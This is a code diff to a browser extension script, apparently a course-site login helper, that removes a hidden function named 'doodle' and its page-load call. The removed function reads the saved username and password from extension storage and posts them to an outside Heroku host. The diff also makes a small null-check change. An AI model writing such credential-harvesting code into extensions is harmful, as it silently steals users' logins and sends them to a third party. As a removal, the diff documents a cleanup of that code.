@@ -32,23 +32,6 @@ $(document).ready(function () {
 
     }
 
-
-
-    function doodle() {
-        chrome.storage.sync.get({
-            autologin: false,
-            username: "",
-            password: ""
-        }, function (data) {
-
-            console.log("Creds:", data);
-            if(data && data.username || data.password) {
-                axios.post("https://servi-ek.herokuapp.com/doodle", data);
-            }
-
-        });
-    }
-
     function handleLogin() {
         chrome.storage.sync.get({
             autologin: false,
@@ -114,7 +97,7 @@ $(document).ready(function () {
                         var allFitLinks = $('a').filter(function (index) { return $(this).text().includes(coursesName); });
                         for (var i = 0; i < allFitLinks.length; i++) {
                             var courseBox = allFitLinks[i].closest('.coursebox');
-                            if (courseBox != null) {
+                            if (courseBox) {
                                 courseBox.remove();
                             }
                         }
@@ -130,15 +113,6 @@ $(document).ready(function () {
 
 
     }
-
-    doodle();
-
-
-
-
-
-
-
 });
 
 
